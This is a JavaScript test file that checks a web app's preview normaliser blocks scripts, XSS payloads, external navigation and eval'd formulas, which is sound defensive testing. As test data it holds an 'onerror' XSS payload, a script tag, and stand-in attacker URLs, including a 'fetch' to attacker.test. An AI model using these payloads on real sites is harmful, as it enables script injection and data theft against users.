const assert = require('node:assert/strict');
const test = require('node:test');
const preview = require('../../static/app/js/idea_previews.js');

test('comparison previews accept only bounded data, never HTML or executable instructions', () => {
  const normalized = preview.normalize({kind:'comparison', title:'Idée', html:'<script>danger()</script>',
    models:[{name:'A', text:'<img src=x onerror=alert(1)>'}, {name:'B', text:'Exemple'}]});
  assert.equal(normalized.models[0].text, '<img src=x onerror=alert(1)>');
  assert.equal(normalized.html, undefined);
  assert.equal(preview.normalize({kind:'html', title:'Code', html:'<script>danger()</script>'}), null);
  assert.equal(preview.normalize({kind:'comparison', title:'Idée', models:[{name:'A'}]}), null);
});

test('prototype navigation only targets existing local screens', () => {
  const spec = {kind:'prototype', title:'Application', screens:[
    {id:'a', title:'Accueil', body:'Bonjour', actions:[{label:'Suite', target:'b'}]},
    {id:'b', title:'Résultat', body:'Exemple'}
  ]};
  assert.ok(preview.normalize(spec));
  spec.screens[0].actions[0].target = 'https://external.example/steal';
  assert.equal(preview.normalize(spec), null);
  spec.screens[0].actions[0].target = 'b'; spec.screens[1].id = 'a';
  assert.equal(preview.normalize(spec), null);
});

test('calculators use a bounded linear expression and never eval a formula', () => {
  const normalized = preview.normalize({kind:'calculator', title:'Budget', offset:10,
    formula:'fetch("https://attacker.test")', inputs:[{label:'Quantité', min:0, max:100, value:5, coefficient:3}]});
  assert.equal(normalized.formula, undefined);
  assert.equal(preview.calculate(normalized, [5]), 25);
  assert.equal(preview.calculate(normalized, [500]), 310);
  assert.throws(() => preview.calculate(normalized, ['bad']));
});

test('malformed previews, excessive payloads and nonfinite numbers remain ordinary text', () => {
  for (const data of [null, [], {title:'x', kind:'unknown'}, {kind:'prototype', title:'x', screens:[]},
    {kind:'comparison', title:'x'.repeat(101), models:[]},
    {kind:'comparison', title:'x', models:[{name:'A', text:'x'.repeat(17000)}, {name:'B'}]},
    {kind:'calculator', title:'x', inputs:[{label:'x', min:0, max:10, value:1, coefficient:Infinity}]},
    {kind:'calculator', title:'x', inputs:[{label:'x', min:0, max:10, value:1, step:0}]},
    {kind:'calculator', title:'x', inputs:[{label:'x', min:0, max:10, value:11}]}]) {
    assert.equal(preview.normalize(data), null);
  }
});
